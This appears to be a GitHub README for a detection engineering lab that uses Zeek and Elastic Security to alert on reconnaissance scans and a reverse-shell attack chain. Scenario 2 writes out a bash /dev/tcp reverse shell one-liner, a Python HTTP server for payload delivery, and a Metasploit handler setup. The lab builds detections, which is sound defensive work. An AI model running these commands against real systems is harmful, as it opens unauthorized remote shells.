# Detection Engineering Lab

## Overview
This project demonstrates detection engineering capabilities by monitoring and alerting on malicious activities using:
- **Zeek** for network traffic analysis
- **Elastic Security** as SIEM platform
- Custom detection rules for attacker TTPs (Tactics, Techniques, and Procedures)

<img width="2124" height="522" alt="deepseek_mermaid_20250714_869087" src="https://github.com/user-attachments/assets/31d71967-990b-4b31-ba8b-10c60a0aa853" />


## Tools Used

| Tool               | Purpose                          | Key Commands                          |
|--------------------|----------------------------------|---------------------------------------|
| Zeek               | Network traffic analysis         | `zeekctl deploy`<br>`zeek -C -i eth0` |
| Elastic Agent      | Log collection & forwarding      | `sudo ./elastic-agent install`        |
| Nmap               | Port scanning                    | `nmap -sV -T4 <target>`               |
| Nikto              | Web vulnerability scanning       | `nikto -h http://<target>`            |
| OWASP ZAP          | Web app scanning                 | `zap-cli quick-scan <URL>`            |
| Metasploit         | Exploitation framework           | `msfconsole`<br>`use exploit/multi/handler` |
| Python HTTP Server | Payload delivery                 | `python3 -m http.server 80`           |

---

## Attack Scenarios

### Scenario 1: Web Reconnaissance
![deepseek_mermaid_20250714_b67285](https://github.com/user-attachments/assets/c9520300-7844-4e8a-bef8-851b017a146f)


### Attack Flow
   #### Start web server on Kali:
      sudo python3 -m http.server
Run scans from Parrot:
- Attacker performs reconnaissance with Nmap, Nikto, and ZAP
#### Nmap scan
      nmap -sV 192.168.50.2 -p 8000
#### Nikto scan
      nikto -h http://192.168.50.2:8000     
#### On Ubuntu (Zeek monitoring):
      tail -f /opt/zeek/logs/current/conn.log | grep "Scan::"
- Web server (Kali Linux) receives scanning traffic
- Zeek captures all traffic and logs to Elastic
- Detection alerts created for:
  
        - Nikto scans
        - Nmap scans
        - Threshold alert for >2000 requests

### Zeek detection:

<img width="2481" height="1369" alt="Screenshot 2025-06-22 191401" src="https://github.com/user-attachments/assets/c528e33f-8580-4f8e-938b-2211202fd705" />

### Alert Creation:

<img width="2443" height="1156" alt="image" src="https://github.com/user-attachments/assets/88171b8c-7112-4905-b29a-094856775065" />
<img width="2489" height="1434" alt="Screenshot 2025-06-22 193545" src="https://github.com/user-attachments/assets/8a2fd4d6-0bee-4d01-9acf-3ba8ffd2172d" />
<img width="2476" height="1452" alt="image" src="https://github.com/user-attachments/assets/9959451d-cde7-4095-9f27-db56e1979e3d" />


---


### Scenario 2: Malicious Payload Delivery & Reverse Shell


<img width="1339" height="1696" alt="deepseek_mermaid_20250714_aa1d32" src="https://github.com/user-attachments/assets/b506704e-76f2-4eb6-ae46-05018720e53c" />


### Prequisite:
### Prepare payload on Parrot:
    # Create reverse shell script
    echo 'bash -i >& /dev/tcp/192.168.50.3/8443 0>&1' > shell.sh
    python3 -m http.server 80

    # Setup Metasploit listener
    msfconsole -q
    use exploit/multi/handler
    set payload linux/x86/shell_reverse_tcp
    set LHOST 192.168.50.3
    set LPORT 8443
    exploit

### Attack Flow
- Victim downloads initial dropper script (**script.sh**)
- Dropper performs environment checks:
  
        Linux system verification
        Root privileges check
        Internet connectivity test

#### If conditions met:
  - Downloads secondary payload (**shell.sh**) from attacker's HTTP server
  - **shell.sh** establishes reverse shell to attacker machine

- Attacker catches shell with Metasploit
- Detection alerts created in Elastic for the entire attack chain

### Zeek detection:

<img width="2018" height="1402" alt="image" src="https://github.com/user-attachments/assets/17780945-d00b-4f6d-923f-b46de4c2cbe3" />


